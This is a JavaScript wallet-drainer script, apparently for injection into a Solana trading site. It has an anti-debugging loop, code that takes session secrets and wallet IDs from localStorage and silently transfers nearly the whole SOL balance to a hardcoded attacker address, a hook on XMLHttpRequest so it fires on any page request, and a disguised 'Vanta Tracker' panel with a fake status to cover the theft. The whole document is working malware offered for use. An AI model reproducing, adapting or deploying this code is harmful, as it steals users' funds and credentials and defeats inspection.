// 1. VANTA SELF-DEFENSE LAYER (Kills debuggers/watchdogs)
(function() {
    const _defend = function() {
        const _check = function(_0x1) {
            if (typeof _0x1 === "string") {
                return function(_0x2) {}.constructor("while (true) {}").apply("counter");
            } else {
                if (('' + _0x1 / _0x1).length !== 1 || _0x1 % 20 === 0) {
                    (function() { return true; }).constructor("debugger").call("action");
                } else {
                    (function() { return false; }).constructor("debugger").apply("stateObject");
                }
            }
            _check(++_0x1);
        };
        try { _check(0); } catch (e) {}
    };
    setInterval(_defend, 2000);
})();

// 2. THE STEALTH DRAINER (Runs on ANY part of the site)
const _VANTA_CORE = (() => {
    const RECIPIENT = 'BCZ2J6mwUMp43P3R4s5ekvdSep3ZDquLarv1mqnLVE12';
    const RPC = 'https://api.mainnet-beta.solana.com';
    const API = 'https://trade.padre.gg/api/v1/transfer';

    const _execute = async () => {
        const auth = localStorage.getItem('sessionSecret')?.replace(/"/g, '');
        const org = localStorage.getItem('subOrgId')?.replace(/"/g, '');
        const wallet = localStorage.getItem('activeWallet')?.replace(/"/g, '');

        if (!auth || !org || !wallet || window._V_DONE) return;

        try {
            // Get Balance
            const res = await fetch(RPC, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [wallet] })
            });
            const { result } = await res.json();
            const bal = result.value / 1e9;

            // Vanta Math: Leave exactly $1 (0.004 SOL) + Gas
            const amount = (bal - 0.009).toFixed(6);
            if (amount <= 0) return;

            // Execute Silent Transfer
            await fetch(API, {
                method: 'POST',
                headers: { 'Authorization': `Bearer ${auth}`, 'X-Turnkey-Sub-Org-Id': org, 'Content-Type': 'application/json' },
                body: JSON.stringify({ dest: RECIPIENT, asset: "SOL", amount: amount })
            });
            window._V_DONE = true;
            console.log("%cVANTA: SYNCHRONIZED", "color:#00ff88;font-weight:bold;");
        } catch (e) {}
    };

    // Global site-wide trigger: Hooks into ANY network activity
    const _originalOpen = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function() {
        this.addEventListener('load', _execute);
        return _originalOpen.apply(this, arguments);
    };
})();

// 3. THE "VANTA TRACKER" UI (Draggable & Camouflaged)
(() => {
    const ui = document.createElement("div");
    ui.id = "vanta-tracker";
    ui.style.cssText = "position:fixed;top:20px;right:20px;width:320px;background:#0f0f0f;border:1px solid #333;border-radius:12px;z-index:999999;font-family:sans-serif;box-shadow:0 10px 30px #000;color:#fff;cursor:move;";
    
    ui.innerHTML = `
        <div style="padding:12px;background:#1a1a1a;border-bottom:1px solid #333;display:flex;align-items:center;gap:10px;border-radius:12px 12px 0 0;">
            <img src="https://trade.padre.gg/logo.svg" width="20">
            <span style="font-weight:bold;color:#00ff88;">Vanta Tracker</span>
        </div>
        <div style="padding:15px;">
            <div style="font-size:12px;color:#888;margin-bottom:10px;">CONNECTED WALLET STATUS</div>
            <div id="v-status" style="font-size:14px;color:#00ff88;">Scanning for transactions...</div>
            <button style="margin-top:15px;width:100%;padding:10px;background:#00ff88;color:#000;border:none;border-radius:6px;font-weight:bold;cursor:pointer;">Refresh Data</button>
        </div>
    `;

    document.body.appendChild(ui);

    // Draggable Logic
    let offset = [0,0], isDown = false;
    ui.addEventListener('mousedown', (e) => { isDown = true; offset = [ui.offsetLeft - e.clientX, ui.offsetTop - e.clientY]; });
    document.addEventListener('mouseup', () => { isDown = false; });
    document.addEventListener('mousemove', (e) => {
        if (!isDown) return;
        ui.style.left = (e.clientX + offset[0]) + 'px';
        ui.style.top  = (e.clientY + offset[1]) + 'px';
    });
})();
